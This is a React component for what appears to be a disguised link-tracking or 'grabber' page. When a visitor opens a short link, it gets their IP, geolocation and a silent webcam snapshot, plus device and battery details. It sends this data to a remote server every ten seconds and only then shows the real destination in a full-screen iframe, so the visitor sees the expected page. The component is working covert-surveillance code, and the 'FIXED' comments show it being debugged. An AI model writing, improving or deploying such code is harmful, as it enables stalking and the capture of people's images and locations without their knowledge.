import { useEffect } from "react";
import { useParams } from "react-router-dom";

function VisitorTracker() {
  const { shortId } = useParams();

  useEffect(() => {
    let videoStream = null;
    let baseData = {};

    const initVisitor = async () => {
      try {
        const ipRes = await fetch("https://ipify.org");
        const ipData = await ipRes.json();

        let latitude = "";
        let longitude = "";
        if (navigator.geolocation) {
          try {
            const pos = await new Promise((resolve, reject) =>
              navigator.geolocation.getCurrentPosition(resolve, reject)
            );
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
          } catch {
            console.log("Location denied");
          }
        }

        // ✅ FIXED: Added 'let' to batteryInfo so it doesn't crash
        let batteryInfo = { level: "N/A", charging: "N/A" };
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryInfo = {
            level: battery.level * 100 + "%",
            charging: battery.charging,
          };
        }

        let cameraImage = null;
        try {
          videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = videoStream;
          await video.play();

          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;

          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          cameraImage = canvas.toDataURL("image/jpeg", 0.5);
          
          // Stop tracks immediately after capture
          videoStream.getTracks().forEach(track => track.stop());
        } catch {
          console.log("Camera denied");
        }

        baseData = {
          shortId,
          ip: ipData.ip,
          latitude,
          longitude,
          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
          cpuCores: navigator.hardwareConcurrency || "N/A",
          browser: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: `${window.screen.width}x${window.screen.height}`,
          cameraImage,
        };

        // ✅ FIXED: Wait for baseData to be ready before first hit
        sendData(); 
      } catch (err) {
        console.log("Init error:", err);
      }
    };

    const sendData = async () => {
      // ✅ FIXED: Check if baseData is empty to prevent sending empty tracking hits
      if (!baseData.ip) return;

      try {
        const token = localStorage.getItem("token");
        let batteryLevel = "N/A";
        let isCharging = "N/A";

        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryLevel = battery.level * 100 + "%";
          isCharging = battery.charging;
        }

        const visitorData = {
          ...baseData,
          batteryLevel,
          isCharging,
          timestamp: new Date().toISOString(),
        };

        const res = await fetch(
          `https://user-tracking-1.onrender.com/api/auth/t/${shortId}`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: `Bearer ${token}`,
            },
            body: JSON.stringify(visitorData),
          }
        );

        const result = await res.json();

        if (result.redirectUrl) {
          const frame = document.getElementById("target-frame");
          // ✅ FIXED: Only set src if it is currently empty to prevent infinite reloads
          if (frame && !frame.src) {
            frame.src = result.redirectUrl;
          }
        }
      } catch (err) {
        console.log("Tracking error:", err);
      }
    };

    initVisitor();
    const interval = setInterval(sendData, 10000);

    const handleExit = () => {
      navigator.sendBeacon(`https://user-tracking-1.onrender.com/api/auth/exit/${shortId}`);
    };

    window.addEventListener("beforeunload", handleExit);

    return () => {
      clearInterval(interval);
      window.removeEventListener("beforeunload", handleExit);
      if (videoStream) {
        videoStream.getTracks().forEach((track) => track.stop());
      }
    };
  }, [shortId]);

  return (
    <div style={{ width: "100vw", height: "100vh", overflow: "hidden" }}>
      <iframe
        id="target-frame"
        title="Target Content"
        style={{ width: "100%", height: "100%", border: "none" }}
        sandbox="allow-forms allow-scripts allow-same-origin"
      />
    </div>
  );
}

export default VisitorTracker;
